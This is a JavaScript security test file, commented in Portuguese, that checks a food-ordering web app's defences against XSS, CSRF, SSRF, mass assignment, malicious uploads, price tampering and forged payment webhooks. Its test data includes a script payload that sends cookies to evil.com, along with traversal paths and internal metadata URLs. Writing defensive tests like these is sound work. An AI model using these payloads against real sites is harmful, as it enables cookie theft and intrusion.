import test from 'node:test'
import assert from 'node:assert/strict'
import { sanitizeString, sanitizeFileName, validateImagePayload, validateOrderPayload } from '../lib/security-validation.mjs'
import { validateWebhookSignature } from '../lib/security-transport.mjs'

// ============================================================
// RED TEAM - LOTE 3 (AGENTES 21 A 30: XSS, UPLOAD & PAGAMENTO)
// ============================================================

test('Agent 21 - Injeção: XSS Armazenado em dados persistidos', () => {
  const storedPayloads = [
    { field: 'notes', value: 'Sem cebola <script>document.location="http://evil.com/steal?c="+document.cookie</script>' },
    { field: 'customerName', value: 'Maria <b onmouseover="alert(1)">Silva</b>' },
    { field: 'address', value: 'Rua das Flores, 123 "><svg/onload=confirm(1)>' },
  ]

  for (const item of storedPayloads) {
    const sanitized = sanitizeString(item.value)
    // As tags perigosas devem ser eliminadas ou codificadas em entidades HTML seguras
    assert.equal(sanitized.includes('<script>'), false)
    assert.equal(sanitized.includes('document.cookie'), false)
    assert.equal(sanitized.includes('onmouseover='), false)
    assert.equal(sanitized.includes('<svg'), false)
  }
})

test('Agent 22 - Injeção: XSS baseado em DOM (escapamento padrão do React/JSX)', () => {
  const dangerousUserInput = '<img src=x onerror=alert("dom-xss")>'
  // React renderiza strings como textContent por padrão (não interpreta HTML a menos que use dangerouslySetInnerHTML)
  const renderSafeText = (str) => {
    return sanitizeString(str)
  }

  const rendered = renderSafeText(dangerousUserInput)
  assert.equal(rendered.includes('<img'), false)
  assert.equal(rendered.includes('onerror='), false)
})

test('Agent 23 - Injeção: CSRF em ações mutativas e estado sensível', () => {
  // Verificação de proteção CSRF: Origem cruzada maliciosa
  const verifyCsrfProtection = (reqOrigin, reqMethod, allowedOrigin) => {
    if (reqMethod === 'GET' || reqMethod === 'HEAD') return true
    if (!reqOrigin) return false // Bloqueia requests sem Origin em ações mutativas
    return reqOrigin.toLowerCase() === allowedOrigin.toLowerCase()
  }

  const allowedOrigin = 'https://batatatop.com.br'

  // Ataque CSRF originado de site de terceiro
  const attackerAttempt = verifyCsrfProtection('https://evil-attacker.com', 'POST', allowedOrigin)
  assert.equal(attackerAttempt, false, 'Requisição POST de origem não permitida deve ser rejeitada')

  // Requisição legítima da mesma origem
  const legitimateRequest = verifyCsrfProtection('https://batatatop.com.br', 'POST', allowedOrigin)
  assert.equal(legitimateRequest, true)
})

test('Agent 24 - Injeção: SSRF por URL fornecida pelo usuário', () => {
  const forbiddenSsrfUrls = [
    'http://169.254.169.254/latest/meta-data/', // AWS/Cloud metadata
    'http://localhost:5432',                   // Postgres interno
    'http://127.0.0.1:3000/api/admin',         // Loopback interno
    'file:///etc/passwd',                      // Protocolo local file://
  ]

  const isSafeOutboundUrl = (urlStr) => {
    try {
      const parsed = new URL(urlStr)
      if (parsed.protocol !== 'https:') return false
      const hostname = parsed.hostname.toLowerCase()
      // Whitelist estrita de serviços externos conhecidos
      const allowedHosts = ['api.mercadopago.com', 'exp.host', 'api.callmebot.com']
      return allowedHosts.includes(hostname)
    } catch {
      return false
    }
  }

  for (const maliciousUrl of forbiddenSsrfUrls) {
    assert.equal(isSafeOutboundUrl(maliciousUrl), false, `URL SSRF ${maliciousUrl} deve ser bloqueada`)
  }

  // URL legítima permitida
  assert.equal(isSafeOutboundUrl('https://api.mercadopago.com/v1/payments/123'), true)
})

test('Agent 25 - Injeção: Mass assignment de campos privilegiados (role, price, is_admin)', () => {
  const untrustedClientInput = {
    customerName: 'Cliente Teste',
    customerPhone: '14999999999',
    deliveryType: 'retirada',
    items: [{ id: 'prod-1', quantity: 1 }],
    // Campos maliciosos injetados via Mass Assignment
    role: 'admin',
    is_admin: true,
    price: 0.01,
    status: 'delivered',
  }

  // Apenas as propriedades permitidas pelo schema do pedido são aceitas
  const extractOrderPayload = (raw) => {
    return {
      customerName: raw.customerName,
      customerPhone: raw.customerPhone,
      deliveryType: raw.deliveryType,
      items: raw.items,
    }
  }

  const sanitizedPayload = extractOrderPayload(untrustedClientInput)
  assert.equal(sanitizedPayload.role, undefined)
  assert.equal(sanitizedPayload.is_admin, undefined)
  assert.equal(sanitizedPayload.price, undefined)
  assert.equal(sanitizedPayload.status, undefined)
})

test('Agent 26 - Upload: Subir arquivo malicioso disfarçado (SVG com script ou EXE com .jpg)', () => {
  // SVG disfarçado
  const svgResult = validateImagePayload('image/svg+xml', 'PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+')
  assert.equal(svgResult.isValid, false)
  assert.ok(svgResult.error.includes('SVG'))

  // Executável com extensão JPG mas header MZ
  const fakeJpgResult = validateImagePayload('image/jpeg', 'TVpQAAIAAAA==')
  assert.equal(fakeJpgResult.isValid, false)
  assert.ok(fakeJpgResult.error.includes('Assinatura binária'))
})

test('Agent 27 - Upload: Path traversal e sobrescrita de arquivos no upload', () => {
  const maliciousFileNames = [
    '../../../../etc/passwd',
    '..\\..\\..\\windows\\system32\\cmd.exe',
    '../../../public/index.html',
  ]

  for (const name of maliciousFileNames) {
    const safeName = sanitizeFileName(name)
    assert.equal(safeName.includes('..'), false)
    assert.equal(safeName.includes('/'), false)
    assert.equal(safeName.includes('\\'), false)
  }
})

test('Agent 28 - Upload: Estourar limite de tamanho de payload (DoS)', () => {
  // Limite estrito de 5MB
  const MAX_FILE_SIZE = 5 * 1024 * 1024
  const oversizedFile = { size: 10 * 1024 * 1024 }

  const checkFileSize = (file) => {
    return file.size <= MAX_FILE_SIZE
  }

  assert.equal(checkFileSize(oversizedFile), false)

  // Pedido com mais de 50 itens
  const excessiveItems = Array.from({ length: 60 }, (_, i) => ({ id: `p-${i}`, quantity: 1 }))
  const orderWithExcessiveItems = {
    customerName: 'Cliente Teste',
    customerPhone: '14999999999',
    items: excessiveItems,
  }
  assert.equal(validateOrderPayload(orderWithExcessiveItems).isValid, false)
})

test('Agent 29 - Pagamento: Manipulação de preço, desconto e total', () => {
  // Simula produtos no banco com preços reais
  const productCatalog = {
    'prod-strogonoff': 25.99,
    'prod-coca': 5.00,
  }

  // Atacante tenta enviar preço adulterado no client
  const clientOrder = {
    items: [
      { id: 'prod-strogonoff', quantity: 2, client_price: 0.50 }, // Fraude: R$ 0,50 em vez de 25,99
      { id: 'prod-coca', quantity: 1, client_price: 0.10 },
    ],
    client_total: 1.10, // Fraude: Total de 1,10 em vez de 56,98
  }

  // O servidor SEMPRE recalcula do catálogo do banco
  const serverRecalculateTotal = (order) => {
    let total = 0
    for (const item of order.items) {
      const realPrice = productCatalog[item.id] || 0
      total += realPrice * item.quantity
    }
    return total
  }

  const realCalculatedTotal = serverRecalculateTotal(clientOrder)
  assert.equal(realCalculatedTotal, 56.98)
  assert.notEqual(realCalculatedTotal, clientOrder.client_total)
})

test('Agent 30 - Pagamento: Falsificar webhook de pagamento (HMAC inválido)', () => {
  const currentTs = Math.floor(Date.now() / 1000)
  const result = validateWebhookSignature({
    secret: 'valid-secret-token',
    signatureHeader: `ts=${currentTs},v1=fake_forged_hash_value_1234567890`,
    requestId: 'req-fake',
    dataId: 'payment-123',
  })

  // Webhook forjado deve ser sumariamente rejeitado
  assert.equal(result.isValid, false)
  assert.ok(result.error.includes('Assinatura'))
})
